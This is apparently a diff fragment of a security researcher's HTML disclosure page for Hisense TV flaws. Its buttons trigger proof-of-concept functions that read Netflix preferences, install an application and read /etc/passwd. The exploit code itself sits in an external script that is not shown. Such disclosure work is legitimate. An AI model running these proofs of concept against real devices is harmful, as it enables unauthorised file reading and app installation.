 <h2 id="reading-netflix-preferences">Reading Netflix Preferences</h2>
 <p><button id="netflix-poc" onclick="do_netflix_poc()">Do It</button></p>
-<pre><code>Netflix PoC
+<pre tabindex="0"><code>Netflix PoC
 </code></pre><h2 id="installing-an-application">Installing an Application</h2>
 <p><button id="install-poc" onclick="do_install_poc()">Pwn It</button>
 <button id="uninstall-poc" onclick="do_uninstall_poc()">Uninstall</button></p>
-<pre><code>Install PoC
+<pre tabindex="0"><code>Install PoC
 </code></pre><h2 id="reading-etcpasswd">Reading <code>/etc/passwd</code></h2>
 <p>You need to be in HTML5 application mode for this – see the section above for a PoC.</p>
 <p><button id="passwd-poc" onclick="do_passwd_poc()">Read It</button></p>
-<pre><code>/etc/passwd PoC
+<pre tabindex="0"><code>/etc/passwd PoC
 </code></pre><hr>
 <p>I&rsquo;ve kindly asked the vendor if they wanted to chat about this but they didn&rsquo;t reply :(</p>
 <script src="/misc/hisensehax/hisensehax.js"></script></div>
